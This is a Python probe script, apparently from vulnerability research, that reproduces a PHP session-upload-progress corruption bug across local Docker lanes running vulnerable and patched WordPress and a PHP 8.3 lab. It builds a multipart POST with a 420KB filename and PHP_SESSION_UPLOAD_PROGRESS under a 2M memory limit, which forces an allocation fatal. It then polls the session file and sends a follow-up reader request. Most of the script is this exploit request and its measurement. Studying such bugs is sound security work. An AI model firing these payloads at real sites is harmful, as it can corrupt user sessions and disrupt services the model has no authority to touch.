#!/usr/bin/env python3
"""cross_lane_probe.py - one producer fire + session-file polling across
lanes, to isolate why the corrupt-token persistence reproduces on the
php83 lab (aarch64 evidence) but not on the WP lanes.

Targets:
  wp-vuln    127.0.0.1:8099  POST /           (php 8.2.34, 2M staged)
  wp-patched 127.0.0.1:8100  POST /           (php 8.2.35, 2M staged)
  lab83      127.0.0.1:8083  POST /lab/index.php (php 8.3.35, dir .htaccess 2M)

Per target: fresh SID, one 420KB-filename multipart producer, then poll
the session file at 0.3/1/3/10s (size + head bytes; flock-safe reads),
then one reader fire (separate connection), then dump everything.
"""
import json
import os
import re
import socket
import subprocess
import sys
import time
import uuid

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from wpfire import http_exchange, build_fire  # noqa: E402

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def sh(args, timeout=20):
    try:
        r = subprocess.run(args, capture_output=True, text=True,
                           timeout=timeout, cwd=REPO)
        return r.returncode, r.stdout
    except subprocess.TimeoutExpired:
        return 124, "<TIMEOUT>"


def sess_read(service, sid):
    """flock-safe: stat + head bytes; returns (size, head_hex) or None."""
    rc, sz = sh(["docker", "compose", "exec", "-T", "-u", "root", service,
                 "sh", "-c",
                 f"f=$(ls /tmp/sess_{sid} /var/lib/php/sessions/sess_{sid} 2>/dev/null | head -1); "
                 f"[ -n \"$f\" ] && stat -c%s \"$f\""])
    if rc != 0 or not sz.strip():
        return None
    try:
        size = int(sz.strip())
    except ValueError:
        return None
    rc, hexout = sh(["docker", "compose", "exec", "-T", "-u", "root", service,
                     "sh", "-c",
                     f"f=$(ls /tmp/sess_{sid} /var/lib/php/sessions/sess_{sid} 2>/dev/null | head -1); "
                     f"[ -n \"$f\" ] && od -An -v -tx1 \"$f\" | head -c 200"])
    head = ""
    if hexout.strip():
        try:
            head = bytes.fromhex("".join(hexout.split())[:192]).hex()
        except ValueError:
            head = "?"
    return size, head


TARGETS = [
    ("wp-vuln", "wordpress-x86", "127.0.0.1", 8099, "/"),
    ("wp-vuln-83", "wordpress-x86-83", "127.0.0.1", 8101, "/"),
    ("wp-patched", "wordpress-patched", "127.0.0.1", 8100, "/"),
    ("lab83", "php83", "127.0.0.1", 8083, "/lab/index.php"),
]


def raw_post(host, port, path, body):
    return ((f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
             f"Content-Type: multipart/form-data; boundary=WPFIRE\r\n"
             f"Content-Length: {len(body)}\r\n"
             f"Connection: close\r\n\r\n").encode() + body)


def main():
    # stage 2M on the WP lanes (lab83 has its own .htaccess 2M)
    for svc in ("wordpress-x86", "wordpress-patched", "wordpress-x86-83"):
        sh(["docker", "compose", "exec", "-T", "-u", "root", svc, "sh", "-c",
            "printf 'memory_limit=2M\\n' > /usr/local/etc/php/conf.d/zz-2m.ini"])
        sh(["docker", "compose", "restart", svc], timeout=60)
    time.sleep(6)
    os.makedirs("results/wp-lastmile/cross-lane", exist_ok=True)
    out = {}
    try:
        for name, service, host, port, path in TARGETS:
            sid = uuid.uuid4().hex[:32]
            body = (b"--WPFIRE\r\n" +
                    b'Content-Disposition: form-data; name="PHPSESSID"\r\n'
                    b"\r\n" + sid.encode() + b"\r\n" +
                    b"--WPFIRE\r\n" +
                    b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n'
                    b"\r\npoc\r\n" +
                    b"--WPFIRE\r\n" +
                    b'Content-Disposition: form-data; name="u"; filename="' +
                    b"A" * (420 * 1024) + b'"\r\n'
                    b"Content-Type: text/plain\r\n\r\nx\r\n" +
                    b"--WPFIRE--\r\n")
            resp = http_exchange(host, port, raw_post(host, port, path, body))
            m = re.search(rb"tried to allocate (\d+)",
                          resp.raw.partition(b"\r\n\r\n")[2])
            rec = {"sid": sid, "resp": resp.summary(),
                   "fatal_alloc": int(m.group(1)) if m else None, "polls": {}}
            for t in (0.3, 1, 3, 10):
                time.sleep(t if t == 0.3 else t - {0.3: 0, 1: 0.3, 3: 1, 10: 3}[t])
                r = sess_read(service, sid)
                rec["polls"][str(t)] = r
                if r and r[0] > 0:
                    break
            # reader on a fresh connection
            rbody = (b"--WPFIRE\r\n" +
                     b'Content-Disposition: form-data; name="PHPSESSID"\r\n'
                     b"\r\n" + sid.encode() + b"\r\n" +
                     b"--WPFIRE\r\n" +
                     b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n'
                     b"\r\nk2\r\n" +
                     b"--WPFIRE\r\n" +
                     b'Content-Disposition: form-data; name="u"; filename="b.txt"\r\n'
                     b"Content-Type: text/plain\r\n\r\ny\r\n" +
                     b"--WPFIRE--\r\n")
            rresp = http_exchange(host, port, raw_post(host, port, path, rbody),
                                  timeout=30)
            m = re.search(rb"tried to allocate (\d+)",
                          rresp.raw.partition(b"\r\n\r\n")[2])
            rec["reader"] = {"resp": rresp.summary(),
                             "fatal_alloc": int(m.group(1)) if m else None}
            out[name] = rec
            print(f"[{name}] producer alloc={rec['fatal_alloc']} polls="
                  f"{rec['polls']} reader_alloc={rec['reader']['fatal_alloc']}"
                  f" ({rec['reader']['resp']})", flush=True)
    finally:
        for svc in ("wordpress-x86", "wordpress-patched", "wordpress-x86-83"):
            sh(["docker", "compose", "exec", "-T", "-u", "root", svc, "sh", "-c",
                "rm -f /usr/local/etc/php/conf.d/zz-2m.ini"])
            sh(["docker", "compose", "restart", svc], timeout=60)
    with open("results/wp-lastmile/cross-lane/probe.json", "w") as f:
        json.dump(out, f, indent=1)


if __name__ == "__main__":
    main()
